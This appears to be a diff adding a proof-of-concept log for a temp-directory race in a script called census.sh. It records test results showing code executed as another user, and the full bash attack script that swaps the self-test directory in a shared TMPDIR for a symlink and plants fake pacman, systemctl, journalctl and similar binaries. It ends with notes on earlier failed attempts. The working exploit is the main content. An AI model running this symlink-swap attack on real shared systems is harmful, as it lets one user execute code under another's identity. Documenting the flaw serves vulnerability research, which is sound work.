@@ -1,0 +1,32 @@
+=== C1-S1 / (a) end-to-end, same-uid model (first run, exp3): marker count + summary ===
+census rc=1
+170:TSUKUROI_CENSUS_SELFTEST: FAIL (167 cases, 33 passed, 134 failed)
+marker lines: 2752
+CODE-EXEC-AS vgpnk uid=1000 at 1793189077
+CODE-EXEC-AS vgpnk uid=1000 at 1793189078
+
+--- exp3 attacker program ---
+#!/usr/bin/env bash
+# attacker holds only w+x on the shared TMPDIR; waits for the census to enter its test phase
+S=/fast/scratch/hyaku/tsukuroi-r48/TSentAlias/exp3
+while :; do
+  set -- "$S"/shared/tsukuroi-r3-2-selftest.*
+  [ -d "${1:-}" ] && [ ! -L "${1:-}" ] && break
+  sleep 0.002
+done
+w=$1
+sleep 1.5
+mv -- "$w" "$S/shared/.stash" 2>/dev/null || exit 1
+mkdir -p "$S/atk/bin" "$S/atk/fx"
+ln -s -- "$S/atk" "$w" 2>/dev/null || exit 1
+printf '#!/bin/sh\necho "CODE-EXEC-AS $(id -un) uid=$(id -u) at $(date +%%s)" >> %s/pwned\nprintf "1.0-1\\n"\nexit 0\n' "$S" > "$S/atk/bin/pacman"
+chmod 755 "$S/atk/bin/pacman"
+for f in pacman-conf systemctl dmesg journalctl nvidia-smi lsmod expac; do ln -sf pacman "$S/atk/bin/$f"; done
+while [ ! -e "$S/pwned" ]; do sleep 0.05; done
+
+--- (exp1/exp2) early swap windows: census aborts or writes into the attacker dir ---
+exp2: 'cat > $bin/.dispatch' hit the rename window -> rc=1, message:
+/fast/scratch/hyaku/tsukuroi-r48/TSentAlias/census.sh: line 2115: /fast/scratch/hyaku/tsukuroi-r48/TSentAlias/exp2/shared/tsukuroi-r3-2-selftest.fYWunw/bin/.dispatch: No such file or directory
+exp1: swap landed between the two 'ln -s .dispatch' calls -> rc=1, message:
+both left the real fixture renamed in the shared TMPDIR (.stash*), never removed:
+exp2/shared/.stash
